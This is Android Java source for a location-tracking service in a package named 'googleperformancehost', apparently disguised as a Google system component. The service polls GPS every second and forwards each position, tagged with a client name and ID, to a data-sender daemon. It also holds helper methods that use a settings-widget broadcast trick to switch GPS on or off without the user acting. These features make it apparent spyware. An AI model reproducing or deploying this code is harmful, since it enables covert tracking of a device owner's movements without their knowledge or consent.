package com.example.tiber.googleperformancehost.Services.Temporary;

import android.Manifest;
import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.support.v4.app.ActivityCompat;
import android.util.Log;

import com.example.tiber.googleperformancehost.R;
import com.example.tiber.googleperformancehost.Services.Daemons.SmallDataSender;
import com.example.tiber.googleperformancehost.SharedClasses.Objects.LocationData;
import com.google.gson.Gson;

/**
 * Created by tiber on 10/27/2016.
 */

public class GPSLocatorIntentService extends IntentService implements LocationListener {

    private final static int INTERVAL_TIME_SECONDS = 1 * 1000; // 20 seconds
    private final static float INTERVAL_DISTANCE_METERS = 1f; // 0 meters
    ///for GPS use
    private LocationManager locationManager;
    private LocationListener locationListener;
    private boolean gpsON;
    ////
    Context appContext;

    private final String debugTag = this.getClass().getSimpleName().toString() + "";

   // public GPSLocatorIntentService(Context appContext) {

   // }

    public GPSLocatorIntentService(){
        super("GPSLOCATOR");
        Log.wtf(debugTag, this.getClass().toString() + "default ctor");
    }
    public GPSLocatorIntentService(String name) {
        super(name);
        Log.wtf(debugTag, this.getClass().toString() + "constructor cu name");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        this.appContext = getApplicationContext();
        locationManager = (LocationManager) appContext.getSystemService(Context.LOCATION_SERVICE);
        if (ActivityCompat.checkSelfPermission(appContext, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(appContext, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED)
            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,
                    INTERVAL_TIME_SECONDS,
                    INTERVAL_DISTANCE_METERS, this);
        Log.wtf(debugTag," last known location" + locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER));
    }


    @Override
    public void onLocationChanged(Location location) {

        Log.wtf(debugTag,"onLocationChanged() "+ location.toString());
        Intent forDataSender = new Intent(appContext, SmallDataSender.class);
        LocationData locationData = new LocationData(location.getLatitude(), location.getLongitude(),
                appContext.getString(R.string.CLIENT_NAME),
                appContext.getResources().getInteger(R.integer.CLIENT_ID));
        forDataSender.putExtra("locationData", new Gson().toJson(locationData, LocationData.class));
        forDataSender.putExtra("what", "locationUpdate");
        appContext.startService(forDataSender);
    }

    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {

    }

    @Override
    public void onProviderEnabled(String provider) {

    }

    @Override
    public void onProviderDisabled(String provider) {

    }

    boolean isGPSEnabled(){
        final LocationManager manager = (LocationManager)appContext. getSystemService( Context.LOCATION_SERVICE );

        if ( manager.isProviderEnabled( LocationManager.GPS_PROVIDER ) ) {
            return true;
        }
        return false;
    }

    private void turnGPSOff(){
        if(isGPSEnabled()){
            final Intent poke = new Intent();
            poke.setClassName("com.android.settings", "com.android.settings.widget.SettingsAppWidgetProvider");
            poke.addCategory(Intent.CATEGORY_ALTERNATIVE);
            poke.setData(Uri.parse("3"));
            appContext.sendBroadcast(poke);
        }
    }

    private void turnGPSOn(){
        String provider = Settings.Secure.getString(getContentResolver(), Settings.Secure.LOCATION_PROVIDERS_ALLOWED);

        if(!provider.contains("gps")){ //if gps is disabled
            final Intent poke = new Intent();
            poke.setClassName("com.android.settings", "com.android.settings.widget.SettingsAppWidgetProvider");
            poke.addCategory(Intent.CATEGORY_ALTERNATIVE);
            poke.setData(Uri.parse("3"));
            appContext.sendBroadcast(poke);
        }
    }

}
